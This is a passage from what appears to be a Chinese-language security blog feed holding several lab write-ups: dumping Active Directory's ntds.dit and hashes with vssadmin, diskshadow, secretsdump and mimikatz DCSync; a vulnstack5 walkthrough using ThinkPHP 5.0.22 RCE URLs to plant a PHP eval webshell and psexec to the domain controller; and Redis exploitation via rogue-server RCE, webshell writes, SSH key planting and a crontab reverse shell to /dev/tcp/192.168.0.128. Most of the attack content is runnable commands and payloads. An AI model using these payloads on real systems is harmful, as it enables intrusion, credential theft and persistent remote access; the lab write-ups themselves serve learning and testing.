<h5 id="卸载并删除快照"><a href="#卸载并删除快照" class="headerlink" title="卸载并删除快照"></a>卸载并删除快照</h5><p><code>ntdsutil snapshot &quot;unmout &#123;GUID&#125;&quot; &quot;delete &#123;GUID&#125;&quot; quit quit</code></p>
<p><img src="/posts/77c245ea/ntdsutil_delete_snapshot.png"></p>
<h5 id="检查快照是否删除"><a href="#检查快照是否删除" class="headerlink" title="检查快照是否删除"></a>检查快照是否删除</h5><p><code>ntdsutil snapshot &quot;List All&quot; quit quit</code></p>
<p><img src="/posts/77c245ea/ntdsutil_check_snapshot.png"></p>
<br>

<h4 id="利用vssadmin提取ntds-dit"><a href="#利用vssadmin提取ntds-dit" class="headerlink" title="利用vssadmin提取ntds.dit"></a>利用vssadmin提取ntds.dit</h4><p><code>vssadmin</code>是Windows上的一个卷影拷贝服务的命令行管理工具，可用于创建和删除卷影拷贝、列出卷影拷贝的信息，显示已安装的所有卷影拷贝写入程序和提供程序，以及改变卷影拷贝的存储空间的大小等。</p>
<p>适用于   Windows 10，Windows 8.1，Windows Server 2016，Windows Server 2012 R2，Windows Server 2012，Windows Server 2008 R2，Windows Server 2008</p>
<h5 id="创建一个C盘的卷影拷贝"><a href="#创建一个C盘的卷影拷贝" class="headerlink" title="创建一个C盘的卷影拷贝"></a>创建一个C盘的卷影拷贝</h5><p><code>vssadmin create shadow /for=c:</code></p>
<h5 id="将创建的卷影拷贝中的ntds-dit-copy到桌面"><a href="#将创建的卷影拷贝中的ntds-dit-copy到桌面" class="headerlink" title="将创建的卷影拷贝中的ntds.dit copy到桌面"></a>将创建的卷影拷贝中的ntds.dit copy到桌面</h5><p><code>copy \\?\CLOBALROOT\Device\HarddiskVolumeShadowCopy2\windows\NTDS\ntds.dit c:\User\Administrator\Desktop ntds.dit</code></p>
<h5 id="删除创建的卷影拷贝"><a href="#删除创建的卷影拷贝" class="headerlink" title="删除创建的卷影拷贝"></a>删除创建的卷影拷贝</h5><p><code>vssadmin delete shadows /for=c:  /quiet</code></p>
<p><img src="/posts/77c245ea/vssadmin.png"></p>
<br>

<h4 id="利用vssown-vbs-脚本提取nods-dit"><a href="#利用vssown-vbs-脚本提取nods-dit" class="headerlink" title="利用vssown.vbs 脚本提取nods.dit"></a>利用vssown.vbs 脚本提取nods.dit</h4><p>下载地址：<code>https://raw.githubusercontent.com/borigue/ptscripts/master/windows/vssown.vbs</code></p>
<p>vssown.vbs功能与vssadmin类似，本质是通过wmi对shadowCopt进行操作，可用于创建和删除卷影拷贝，以及启动和停止卷影拷贝服务</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">&#x2F;&#x2F;启动卷影拷贝服务</span><br><span class="line">cscript vssown.vbs &#x2F;start</span><br><span class="line">&#x2F;&#x2F;创建一个C盘的卷影拷贝</span><br><span class="line">cscript vssown.vbs &#x2F;create c</span><br><span class="line">&#x2F;&#x2F;列出当前卷影拷贝</span><br><span class="line">cscript vssown.vbs &#x2F;list</span><br><span class="line">&#x2F;&#x2F;复制ntds.dit到桌面</span><br><span class="line">copy \\?\GLOBALROOT\Device\HarddiskVolumeShadowCopy3\windows\NTDS\ntds.dit C:\Users\Administrator\Desktop\ntds.dit</span><br><span class="line">&#x2F;&#x2F;删除卷影拷贝</span><br><span class="line">cscript vssown.vbs &#x2F;delete &#123;GUID&#125;</span><br></pre></td></tr></table></figure>

<p><img src="/posts/77c245ea/vssown.png"></p>
<h4 id="使用ntdsutil中的IFM获取ntds-dit"><a href="#使用ntdsutil中的IFM获取ntds-dit" class="headerlink" title="使用ntdsutil中的IFM获取ntds.dit"></a>使用ntdsutil中的IFM获取ntds.dit</h4><p>将ntds.dit复制到<code>C:\test\Active Directory\ </code>文件夹中</p>
<p>使用管理员模式打开cmd输入如下</p>
<p><code>ntdsutil &quot;ac i ntds&quot; &quot;ifm&quot; &quot;create full C:/test&quot; q  q</code></p>
<p><img src="/posts/77c245ea/ntdsutil_IFM.png"></p>
<p>然后访问c盘 可以看到创建了一个test目录  </p>
<p>test目录下有俩个文件 分别为 <code>Active Directory</code>  和 <code>registry</code></p>
<p><code>registry</code>下包含 <code>SYSTEM</code> 和 <code>SECURITY</code></p>
<p><code>Active Directory</code>下包含 <code>ntds.dit</code></p>
<p><img src="/posts/77c245ea/test_file.png"></p>
<p>然后将以上内容复制到桌面</p>
<p>这里选择使用<code>Copy-VSS.ps1</code></p>
<p>下载地址：<code>https://github.com/samratashok/nishang/blob/master/Gather/Copy-VSS.ps1</code></p>
<p>进入powershell </p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">Set-Executionpolicy bypass</span><br><span class="line">Import-Module .\Copy-VSS.ps1  &#x2F;&#x2F;导入脚本</span><br><span class="line">copy-vss    &#x2F;&#x2F;执行脚本</span><br><span class="line"></span><br></pre></td></tr></table></figure>

<p><img src="/posts/77c245ea/copy_vss.png"></p>
<br>

<h4 id="使用diskshadow导出ntds-dit"><a href="#使用diskshadow导出ntds-dit" class="headerlink" title="使用diskshadow导出ntds.dit"></a>使用diskshadow导出ntds.dit</h4><p><code>Diskshadow.exe</code>使用卷影拷贝服务（VSS）所提供的多个功能。默认配置下，Diskshadow.exe使用了一种交互式的命令解释器,这里跟DiskRaid或者DiskPart比较类似。因为diskshadow的代码是由微软签名的，而且<code>Windows Server2008、Windows Server2012、Windows Server2016都默认包含diskshadow</code>。所以，diskshadow也可以用来操作卷影拷贝服务并导出ntds.dit。diskshadow的功能与vshadow类似，且同样位于<code>C:\windows\system32\ </code>目录下.</p>
<p>由于是微软官方的工具，所以不会被杀</p>
<p>查看<code>diskshadow.exe</code> 的帮助信息</p>
<p><code>diskshdow /?</code></p>
<p>一般先在C盘写入需要执行的命令 存储为command.txt</p>
<p><code>echo &quot;exec c:\windows\system32\calc.exe&quot;  &gt;command.txt</code></p>
<p>但是这样生成的commod.txt会存在双引号 这样执行diskshadow命令的话 会无法正常执行，所以最好在执行diskshadow命令前先看下command.txt 是否正确</p>
<p><code>type c:\command.txt</code></p>
<p><code>diskshadow /s c:\command</code> </p>
<p>然后会弹出之前写的calc</p>
<p><img src="/posts/77c245ea/diskshadow_calc.png"></p>
<p>使用<code>diskshadow.exe</code>导出<code>ntds.dit</code> 将命令写入文本文件中</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">&#x2F;&#x2F;设置卷影拷贝</span><br><span class="line">set context persistent nowriters</span><br><span class="line">&#x2F;&#x2F;添加卷</span><br><span class="line">add volume c: alias someAlias</span><br><span class="line">&#x2F;&#x2F;创建快照</span><br><span class="line">create</span><br><span class="line">&#x2F;&#x2F;分配虚拟磁盘盘符</span><br><span class="line">expose %someAlias% k:</span><br><span class="line">&#x2F;&#x2F;将ntds.dit复制到C盘中</span><br><span class="line">exec &quot;cmd.exe&quot; &#x2F;c copy k:\Windows\NTDS\ntds.dit C:\Users\Administrator\Desktop\</span><br><span class="line">&#x2F;&#x2F;删除所有快照</span><br><span class="line">delete shadows all</span><br><span class="line">&#x2F;&#x2F;列出系统中的卷影拷贝</span><br><span class="line">list shadows all</span><br><span class="line">&#x2F;&#x2F;重置</span><br><span class="line">reset</span><br><span class="line">&#x2F;&#x2F;退出</span><br><span class="line">exit</span><br></pre></td></tr></table></figure>

<p>然后使用<code>diskshadow.exe</code>加载这个文本文件</p>
<p><code>diskshadow /s c:\2.txt</code></p>
<p>在执行这条命令时 要在system32下执行，否则可能会报错</p>
<p><img src="/posts/77c245ea/diskshadow_2.png"></p>
<p>导出ntds.dit后，可以将system.hive转储。因为system.hive中存放着ntds.dit的密钥，如果没有该密钥，将无法查看ntds.dit中的信息</p>
<p>可以使用Copy-VSS.ps1等方法导出SYSTEM文件，也可以执行如下命令，将导出system</p>
<p><code>reg save hklm\system C:\Users\Administrator\Desktop\system.hive</code></p>
<p><img src="/posts/77c245ea/reg_system.png"></p>
<br>

<h3 id="解析ntds-dit"><a href="#解析ntds-dit" class="headerlink" title="解析ntds.dit"></a>解析ntds.dit</h3><h4 id="使用impacket-secretsdump解析ntds-dit"><a href="#使用impacket-secretsdump解析ntds-dit" class="headerlink" title="使用impacket secretsdump解析ntds.dit"></a>使用impacket secretsdump解析ntds.dit</h4><p><code>secretsdump.exe -system SYSTEM.hive -ntds ntds.dit LOCAL</code></p>
<p>然后可以看到所有用户的hash值</p>
<p><img src="/posts/77c245ea/secretsdump_ntds.png"></p>
<h4 id="利用dcsync-获取域散列值"><a href="#利用dcsync-获取域散列值" class="headerlink" title="利用dcsync 获取域散列值"></a>利用dcsync 获取域散列值</h4><h5 id="利用mimikatz在线导出hash"><a href="#利用mimikatz在线导出hash" class="headerlink" title="利用mimikatz在线导出hash"></a>利用mimikatz在线导出hash</h5><p>可以利用dcsync获取</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">privilege::debug</span><br><span class="line">lsadump::dcsync &#x2F;domain:mamor.com &#x2F;all &#x2F;csv</span><br></pre></td></tr></table></figure>

<p><img src="/posts/77c245ea/mimikatz_dcsync.png"></p>
<p>也可以导出指定用户的hash值</p>
<p><code>lsadump::dcsync /domain:mamor.com /user:Mamor</code></p>
<p><img src="/posts/77c245ea/dcsync_user.png"></p>
<p>通过转储lsass.exe 进程对hash值进行dump</p>
<p><code>lsadump::lsa  /inject</code></p>
<p>这样可以导出所有账户和域散列值</p>
<p><img src="/posts/77c245ea/mimikatz_lsa1.png"></p>
<p><img src="/posts/77c245ea/mimikatz_lsa2.png"></p>
<h5 id="使用powershell-Invoke-DCSync-ps1脚本"><a href="#使用powershell-Invoke-DCSync-ps1脚本" class="headerlink" title="使用powershell Invoke-DCSync.ps1脚本"></a>使用powershell Invoke-DCSync.ps1脚本</h5><p>下载地址：<code>https://gist.github.com/monoxgas/9d238accd969550136db</code></p>
<p>该脚本可以利用dcsync 直接读取ntds.dit 以获得域账号和域散列值</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">Import-Module .\Invoke-DCSync.ps1</span><br><span class="line">Invoke-DCSync -DumpForest | ft -wrap -autosize    &#x2F;&#x2F; 导出域内所有用户的hash</span><br><span class="line"></span><br><span class="line">Invoke-DCSync -DumpForest -Users @(&quot;administrator&quot;) | ft -wrap -autosize      &#x2F;&#x2F; 导出域内administrator账户的hash</span><br><span class="line"></span><br></pre></td></tr></table></figure>

<p><img src="/posts/77c245ea/ps_invoke-DCSync.png"></p>
<br>

<br>

<h3 id="Reference"><a href="#Reference" class="headerlink" title="Reference"></a>Reference</h3><blockquote>
<p><a href="https://pingmaoer.github.io/2020/07/03/%E5%9F%9F%E6%8E%A7%E5%88%B6%E5%99%A8/">https://pingmaoer.github.io/2020/07/03/%E5%9F%9F%E6%8E%A7%E5%88%B6%E5%99%A8/</a></p>
<p><a href="https://www.freebuf.com/articles/network/251267.html">https://www.freebuf.com/articles/network/251267.html</a></p>
<p><a href="https://cloud.tencent.com/developer/article/1731472">https://cloud.tencent.com/developer/article/1731472</a></p>
</blockquote>
]]></content>
      <categories>
        <category>内网渗透</category>
      </categories>
      <tags>
        <tag>内网渗透</tag>
      </tags>
  </entry>
  <entry>
    <title>vulnstack5靶场</title>
    <url>/posts/4f399e45/</url>
    <content><![CDATA[<h3 id="环境搭建"><a href="#环境搭建" class="headerlink" title="环境搭建"></a>环境搭建</h3><blockquote>
<p>2008     192.168.138.138(内网)             sun\admin 2021.com</p>
<p>win7     192.168.138.136(内网)            192.168.135.150(外网)</p>
<p>sun\leo123.com    sun\Administrator dc123.com</p>
<p>启动phpstudy</p>
<p>kali        192.168.135.128(外网)</p>
</blockquote>
<h3 id="信息收集"><a href="#信息收集" class="headerlink" title="信息收集"></a>信息收集</h3><h4 id="端口扫描"><a href="#端口扫描" class="headerlink" title="端口扫描"></a>端口扫描</h4><p><code>sudo nmap -sV 192.168.135.150 </code></p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">Nmap scan report for 192.168.135.150</span><br><span class="line">Host is up (0.00042s latency).</span><br><span class="line">Not shown: 991 filtered ports</span><br><span class="line">PORT      STATE SERVICE      VERSION</span><br><span class="line">80&#x2F;tcp    open  http         Apache httpd 2.4.23 ((Win32) OpenSSL&#x2F;1.0.2j PHP&#x2F;5.5.38)</span><br><span class="line">135&#x2F;tcp   open  msrpc        Microsoft Windows RPC</span><br><span class="line">139&#x2F;tcp   open  netbios-ssn  Microsoft Windows netbios-ssn</span><br><span class="line">445&#x2F;tcp   open  microsoft-ds Microsoft Windows 7 - 10 microsoft-ds (workgroup: SUN)</span><br><span class="line">3306&#x2F;tcp  open  mysql        MySQL (unauthorized)</span><br><span class="line">49152&#x2F;tcp open  msrpc        Microsoft Windows RPC</span><br><span class="line">49153&#x2F;tcp open  msrpc        Microsoft Windows RPC</span><br><span class="line">49154&#x2F;tcp open  msrpc        Microsoft Windows RPC</span><br><span class="line">49176&#x2F;tcp open  msrpc        Microsoft Windows RPC</span><br><span class="line">MAC Address: 00:0C:29:B5:F4:E9 (VMware)</span><br><span class="line">Service Info: Host: WIN7; OS: Windows; CPE: cpe:&#x2F;o:microsoft:windows</span><br></pre></td></tr></table></figure>

<p>开放了80，3306 系统为Win7</p>
<h4 id="目录扫描"><a href="#目录扫描" class="headerlink" title="目录扫描"></a>目录扫描</h4><p><code>dirmap -i 192.168.135.150 -lcf</code></p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">[+] Load targets from: 192.168.135.150</span><br><span class="line">[+] Set the number of thread: 30</span><br><span class="line">[+] Coroutine mode</span><br><span class="line">[+] Current target: http:&#x2F;&#x2F;192.168.135.150&#x2F;                                                 </span><br><span class="line">[*] Launching auto check 404</span><br><span class="line">[+] Checking with: http:&#x2F;&#x2F;192.168.135.150&#x2F;hsnwdxgvjhcohdgnyqwwyagtdjaanxwsamkblggcfg</span><br><span class="line">[*] Use recursive scan: No                                                                  </span><br><span class="line">[*] Use dict mode</span><br><span class="line">[+] Load dict:&#x2F;home&#x2F;kali&#x2F;Tools&#x2F;dirmap&#x2F;data&#x2F;dict_mode_dict.txt</span><br><span class="line">[*] Use crawl mode</span><br><span class="line">[200][text&#x2F;html; charset&#x3D;utf-8][931.00b] http:&#x2F;&#x2F;192.168.135.150&#x2F;0                           </span><br><span class="line">[200][text&#x2F;html; charset&#x3D;utf-8][1.60kb] http:&#x2F;&#x2F;192.168.135.150&#x2F;add.php                      </span><br><span class="line">[200][image&#x2F;x-icon][1.12kb] http:&#x2F;&#x2F;192.168.135.150&#x2F;favicon.ico                              </span><br><span class="line">[200][text&#x2F;html; charset&#x3D;utf-8][931.00b] http:&#x2F;&#x2F;192.168.135.150&#x2F;Index                        </span><br><span class="line">[200][text&#x2F;html; charset&#x3D;utf-8][931.00b] http:&#x2F;&#x2F;192.168.135.150&#x2F;index                        </span><br><span class="line">[200][text&#x2F;html; charset&#x3D;utf-8][931.00b] http:&#x2F;&#x2F;192.168.135.150&#x2F;index.html                   </span><br><span class="line">[200][text&#x2F;html; charset&#x3D;utf-8][931.00b] http:&#x2F;&#x2F;192.168.135.150&#x2F;index.php                    </span><br><span class="line">[200][text&#x2F;html; charset&#x3D;utf-8][931.00b] http:&#x2F;&#x2F;192.168.135.150&#x2F;INDEX.PHP                    </span><br><span class="line">[200][text&#x2F;html; charset&#x3D;utf-8][931.00b] http:&#x2F;&#x2F;192.168.135.150&#x2F;index.PHP                    </span><br><span class="line">[200][text&#x2F;plain][24.00b] http:&#x2F;&#x2F;192.168.135.150&#x2F;robots.txt    </span><br></pre></td></tr></table></figure>

<p>查看报错页面可以发现为thinkphp V5.0.22</p>
<p>扫到一个大马  <code>http://192.168.135.150/add.php</code> 但是不知道密码多少</p>
<p><img src="/posts/4f399e45/dama.png"></p>
<h3 id="外网打点"><a href="#外网打点" class="headerlink" title="外网打点"></a>外网打点</h3><p>访问80端口 版本为 thinkphp  V5.0.22</p>
<p>POC</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line"># whoami</span><br><span class="line">http:&#x2F;&#x2F;192.168.135.150&#x2F;?s&#x3D;index&#x2F;\think\app&#x2F;invokefunction&amp;function&#x3D;call_user_func_array&amp;vars[0]&#x3D;system&amp;vars[1][]&#x3D;whoami</span><br><span class="line"># phpinfo</span><br><span class="line">http:&#x2F;&#x2F;192.168.135.150&#x2F;?s&#x3D;index&#x2F;\think\app&#x2F;invokefunction&amp;function&#x3D;call_user_func_array&amp;vars[0]&#x3D;phpinfo&amp;vars[1][]&#x3D;1</span><br><span class="line"># pwd</span><br><span class="line">http:&#x2F;&#x2F;192.168.135.150&#x2F;?s&#x3D;index&#x2F;\think\app&#x2F;invokefunction&amp;function&#x3D;call_user_func_array&amp;vars[0]&#x3D;system&amp;vars[1][]&#x3D;powershell%20pwd</span><br><span class="line"># 写一句话</span><br><span class="line"># 如果是linux使用echo写入文件 如果是win使用file_put_contents写入</span><br><span class="line"># ?s&#x3D;&#x2F;index&#x2F;\think\app&#x2F;invokefunction&amp;function&#x3D;call_user_func_array&amp;vars[0]&#x3D;system&amp;vars[1][]&#x3D;echo%20^%3C?php%20@eval($_GET[%22pass%22])?^%3E%3Eshell.php</span><br><span class="line"># ?s&#x3D;index&#x2F;\think\app&#x2F;invokefunction&amp;function&#x3D;call_user_func_array&amp;vars[0]&#x3D;file_put_contents&amp;vars[1][]&#x3D;shell.php&amp;vars[1][]&#x3D;%3C%3Fphp%20eval(%24_POST%5B&#39;pass&#39;%5D)%3B%3F%3E</span><br><span class="line">http:&#x2F;&#x2F;192.168.135.150&#x2F;?s&#x3D;index&#x2F;\think\app&#x2F;invokefunction&amp;function&#x3D;call_user_func_array&amp;vars[0]&#x3D;file_put_contents&amp;vars[1][]&#x3D;shell.php&amp;vars[1][]&#x3D;%3C%3Fphp%20eval(%24_POST[%27shell%27])%3B%3F%3E</span><br></pre></td></tr></table></figure>

<p>然后使用蚁剑连接 </p>
<p><img src="/posts/4f399e45/ant_shell.png"></p>
<p>发现是admin权限</p>
<h3 id="内网渗透"><a href="#内网渗透" class="headerlink" title="内网渗透"></a>内网渗透</h3><p>上线CS 为administrator权限</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">信息整理</span><br><span class="line">win7</span><br><span class="line">ip 192.168.138.136(内网)  192.168.135.150(外网)   DCip 192.168.138.138</span><br><span class="line">域 sun.com</span><br><span class="line">补丁      [01]: KB2534111</span><br><span class="line">          [02]: KB2999226</span><br><span class="line">          [03]: KB976902</span><br><span class="line">http:&#x2F;&#x2F;bugs.hacking8.com&#x2F;tiquan&#x2F;</span><br><span class="line"></span><br></pre></td></tr></table></figure>

<p>然后进行提权，但这里使用ms15-051 和 ms14-058都没成功</p>
<p>使用CS run mimikatz  读取到了Administrator 和 leo 的密码</p>
<p><img src="/posts/4f399e45/logonpassword.png"></p>
<p>扫描一下内网中的主机 445 </p>
<p><code>portscan 192.168.138.0/24 445 arp 50</code></p>
<p>尝试使用抓到的leo用户 进行psexec</p>
<p><img src="/posts/4f399e45/psexec_win_system.png"></p>
<p>得到win7 system权限</p>
<p>由于DC不出网使用win7作为跳板机建立Listener </p>
<p><img src="/posts/4f399e45/neiwang1.png"></p>
<p><img src="/posts/4f399e45/neiwang2.png"></p>
<p>然后通过psexec 上线DC 得到DC机器的system全息</p>
<p><img src="/posts/4f399e45/dc_psexec1.png"></p>
<p><img src="/posts/4f399e45/dc_psexec2.png"></p>
<p><img src="/posts/4f399e45/dc_system.png"></p>
<p><img src="/posts/4f399e45/tuopu.png"></p>
<p>run mimikatz 看下dc机器的密码</p>
<p><img src="/posts/4f399e45/dc_passwd.png"></p>
]]></content>
      <categories>
        <category>vulnstack</category>
      </categories>
      <tags>
        <tag>vulnstack</tag>
      </tags>
  </entry>
  <entry>
    <title>redisRCE复现</title>
    <url>/posts/27814dfe/</url>
    <content><![CDATA[<h3 id="redis4-x-5-x-RCE"><a href="#redis4-x-5-x-RCE" class="headerlink" title="redis4.x/5.x RCE"></a>redis4.x/5.x RCE</h3><h4 id="影响版本"><a href="#影响版本" class="headerlink" title="影响版本"></a>影响版本</h4><p>4.x-5.x</p>
<h4 id="主从模式"><a href="#主从模式" class="headerlink" title="主从模式"></a>主从模式</h4><p>主从模式就是指使用一个redis实例作为主机，其他实例都作为备份机，其中主机和从机数据相同，而从机只负责读，主机只负责写，通过读写分离可以大幅度减轻流量的压力，算是一种通过牺牲空间来换取效率的缓解方式。</p>
<h4 id="redis模块"><a href="#redis模块" class="headerlink" title="redis模块"></a>redis模块</h4><p>在Reids 4.x之后，Redis新增了模块功能，通过外部拓展，可以实现在redis中实现一个新的Redis命令，通过写c语言并编译出.so文件。</p>
<h4 id="利用原理"><a href="#利用原理" class="headerlink" title="利用原理"></a>利用原理</h4><p>在两个Redis实例设置主从模式的时候，Redis的主机实例可以通过FULLRESYNC同步文件到从机上。然后在从机上加载so文件，我们就可以执行拓展的新命令了。</p>
<h3 id="环境搭建"><a href="#环境搭建" class="headerlink" title="环境搭建"></a>环境搭建</h3><figure class="highlight plain"><table><tr><td class="code"><pre><span class="line"># 下载redis</span><br><span class="line">wget http:&#x2F;&#x2F;download.redis.io&#x2F;releases&#x2F;redis-5.0.0.tar.gz</span><br><span class="line">tar -xvzf redis-5.0.0.tar.gz</span><br><span class="line">cd redis-5.0.0</span><br><span class="line">make</span><br><span class="line"></span><br><span class="line"># 更改配置文件</span><br><span class="line">cd redis-5.0.0</span><br><span class="line">vim redis.conf</span><br><span class="line">      protected-mode yes 改为protected-mode no</span><br><span class="line">      bind 127.0.0.1 改为 bind 0.0.0.0</span><br><span class="line"></span><br><span class="line"># 启动redis</span><br><span class="line">cd src</span><br><span class="line">.&#x2F;redis-server ..&#x2F;redis.conf   # 加载指定配置</span><br><span class="line"></span><br><span class="line"># 关闭防火墙</span><br><span class="line">systemctl stop firewalld </span><br></pre></td></tr></table></figure>

<h3 id="漏洞复现"><a href="#漏洞复现" class="headerlink" title="漏洞复现"></a>漏洞复现</h3><p>exp下载 <code>https://github.com/n0b0dyCN/redis-rogue-server</code></p>
<p>用法:<code>python3 redis-rogue-server.py --rhost=192.168.0.182 --lhost=192.168.0.128 --exp=exp.so</code></p>
<p>-r 反弹shell  -i 实时shell</p>
<p><img src="/posts/27814dfe/exp_i.png"></p>
<p><img src="/posts/27814dfe/exp.png"></p>
<p><img src="/posts/27814dfe/shell.png"></p>
<h3 id="Reference"><a href="#Reference" class="headerlink" title="Reference"></a>Reference</h3><blockquote>
<p><a href="https://paper.seebug.org/975/">https://paper.seebug.org/975/</a></p>
<p><a href="http://www.feidao.site/wordpress/?p=2090">http://www.feidao.site/wordpress/?p=2090</a></p>
<p><a href="https://blog.csdn.net/weixin_43252204/article/details/115181128">https://blog.csdn.net/weixin_43252204/article/details/115181128</a></p>
</blockquote>
]]></content>
      <categories>
        <category>redis</category>
      </categories>
      <tags>
        <tag>redis</tag>
      </tags>
  </entry>
  <entry>
    <title>redis未授权访问漏洞复现</title>
    <url>/posts/19a78c2/</url>
    <content><![CDATA[<h3 id="前言"><a href="#前言" class="headerlink" title="前言"></a>前言</h3><p>Redis 默认情况下，会绑定在 0.0.0.0:6379，这样将会将 Redis 服务暴露到公网上，如果在没有设置密码认证（默认为空）的情况下，会导致任意用户在可以访问目标服务器的情况下未授权访问 Redis 以及读取 Redis 的数据，攻击者在未授权访问 Redis 的情况下，利用 Redis 自身的提供的config 命令，可以进行写文件操作。</p>
<p>影响版本：Redis 2.x，3.x，4.x，5.x。但是在Redis3.2之后增加了<strong>protected-mode</strong>安全模式，默认开启，且绑定了本地IP</p>
<p>所以想要复现需要更改配置</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">bind 127.0.0.1 &#x3D;&gt; bind 0.0.0.0  &#x2F;&#x2F;开启远程访问</span><br><span class="line">protected-mode yes &#x3D;&gt; protested-mode no</span><br></pre></td></tr></table></figure>

<p>为了方便选择使用3.2版本之前的Redis：Redis-2.8.17，不需要修改配置文件即可复现</p>
<h3 id="环境搭建"><a href="#环境搭建" class="headerlink" title="环境搭建"></a>环境搭建</h3><p>centos7 （192.168.0.182）</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line"># 下载redis-2.8.17</span><br><span class="line">wget http:&#x2F;&#x2F;download.redis.io&#x2F;releases&#x2F;redis-2.8.17.tar.gz</span><br><span class="line"></span><br><span class="line"># 解压压缩包 编译安装</span><br><span class="line">tar xzf redis-2.8.17.tar.gz</span><br><span class="line">cd redis-2.8.17</span><br><span class="line">make</span><br><span class="line"></span><br><span class="line"># redis.conf拷贝到&#x2F;etc下面</span><br><span class="line">cp redis.conf &#x2F;etc&#x2F;redis.conf</span><br><span class="line"></span><br><span class="line"># 将redis-server和redis-cli拷贝到&#x2F;usr&#x2F;bin目录下，方便直接启动redis服务器</span><br><span class="line">cd src</span><br><span class="line">cp redis-server &#x2F;usr&#x2F;bin</span><br><span class="line">cp redis-cli &#x2F;usr&#x2F;bin</span><br><span class="line"></span><br><span class="line"># 启动服务</span><br><span class="line">redis-server &#x2F;etc&#x2F;redis.conf</span><br></pre></td></tr></table></figure>

<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line"># 由于是在本地搭建的，没有开启6379端口对外开放，所有先在centos上先关闭防火墙 </span><br><span class="line">systemctl stop firewalld.service</span><br><span class="line">systemctl disable firewalld.service</span><br><span class="line">systemctl status firewalld.service</span><br></pre></td></tr></table></figure>

<h3 id="漏洞利用"><a href="#漏洞利用" class="headerlink" title="漏洞利用"></a>漏洞利用</h3><p>使用kali远程连接redis</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">redis-cli -h 192.168.163.132</span><br></pre></td></tr></table></figure>

<h4 id="写入webshell"><a href="#写入webshell" class="headerlink" title="写入webshell"></a>写入webshell</h4><p>条件</p>
<ul>
<li>成功连接redis服务器</li>
<li>知道web根目录的绝对路径</li>
<li>redis服务器用户有写入权限</li>
</ul>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">config set dir &#x2F;var&#x2F;www&#x2F;html</span><br><span class="line">config set dbfilename shell.php</span><br><span class="line">192.168.0.182:6379&gt; set webshell &quot;&lt;?php phpinfo();?&gt;&quot;</span><br><span class="line">save</span><br></pre></td></tr></table></figure>

<p><img src="/posts/19a78c2/shell.png"></p>
<h4 id="写入ssh公钥远程连接"><a href="#写入ssh公钥远程连接" class="headerlink" title="写入ssh公钥远程连接"></a>写入ssh公钥远程连接</h4><p>1.kali 本地生成ssh公钥</p>
<p><code>ssh-keygen -t rsa</code></p>
<p>2.进入.ssh目录，将公钥写入1.txt</p>
<p><code>cd /root/.ssh</code></p>
<p><code>(echo -e &quot;\n\n&quot;; cat id_rsa.pub; echo -e &quot;\n\n&quot;) &gt; 1.txt</code></p>
<p><img src="/posts/19a78c2/1_txt.png"></p>
<p>3.将1.txt写入靶机</p>
<p><code> cat 1.txt | redis-cli -h 192.168.0.182 -x set crack</code></p>
<p>4.远程登录靶机redis服务</p>
<p><code>redis-cli -h 192.168.0.182</code></p>
<p>5.更改redis备份路径为ssh公钥存放目录（一般默认为/root/.ssh）,设置上传公钥的备份文件名字为authorized_keys，save保存</p>
<p><code>CONFIG GET dir</code></p>
<p><code>config set dir /root/.ssh</code> </p>
<p><code>CONFIG SET dbfilename authorized_keys</code></p>
<p><code>CONFIG GET dbfilename</code> 检查是否有authorized_keys文件</p>
<p><code>save</code></p>
<p><img src="/posts/19a78c2/save_file.png"></p>
<p>6.ssh连接靶机</p>
<p><code>ssh -i id_rsa root@192.168.0.182</code></p>
<p>登录成功</p>
<p><img src="/posts/19a78c2/ssh_conn.png"></p>
<h4 id="利用crontab反弹shell"><a href="#利用crontab反弹shell" class="headerlink" title="利用crontab反弹shell"></a>利用crontab反弹shell</h4><p>kali使用nc监听端口</p>
<p><code>nc -lvvp 5555</code></p>
<p>kali连接redis服务</p>
<p><code>redis-cli -h 192.168.0.182</code></p>
<p>向服务器写入文件</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">set xxx &quot;\n\n*&#x2F;1 * * * * &#x2F;bin&#x2F;bash -i&gt;&amp;&#x2F;dev&#x2F;tcp&#x2F;192.168.0.128&#x2F;5555 0&gt;&amp;1\n\n&quot;</span><br><span class="line">config set dir &#x2F;var&#x2F;spool&#x2F;cron</span><br><span class="line">config set dbfilename root</span><br><span class="line">save</span><br></pre></td></tr></table></figure>

<p>查看nc 是否反弹到shell</p>
<p><img src="/posts/19a78c2/nc_shell.png"></p>
<h3 id="防御"><a href="#防御" class="headerlink" title="防御"></a>防御</h3><ul>
<li><p>禁用高危命令，如远程修改 DB 文件地址</p>
</li>
<li><p>选择使用地权限运行redis服务，且禁止远程登录</p>
</li>
<li><p>设置Redis服务密码，或是绑定本地IP：127.0.0.1</p>
</li>
</ul>
<h3 id="Reference"><a href="#Reference" class="headerlink" title="Reference"></a>Reference</h3><blockquote>
<p><a href="http://www.feidao.site/wordpress/?p=2090">www.feidao.site/wordpress/?p=2090</a></p>
<p><a href="https://www.freebuf.com/vuls/248207.html">https://www.freebuf.com/vuls/248207.html</a></p>
<p><a href="https://www.freebuf.com/vuls/223432.html">https://www.freebuf.com/vuls/223432.html</a></p>
<p><a href="https://www.yyxzz.net/articles/36.html">https://www.yyxzz.net/articles/36.html</a></p>
</blockquote>
]]></content>
      <categories>
        <category>redis</category>
      </categories>
      <tags>
        <tag>redis</tag>
      </tags>
  </entry>
  <entry>
    <title>vulnstack4靶场</title>
    <url>/posts/e94e95f1/</url>
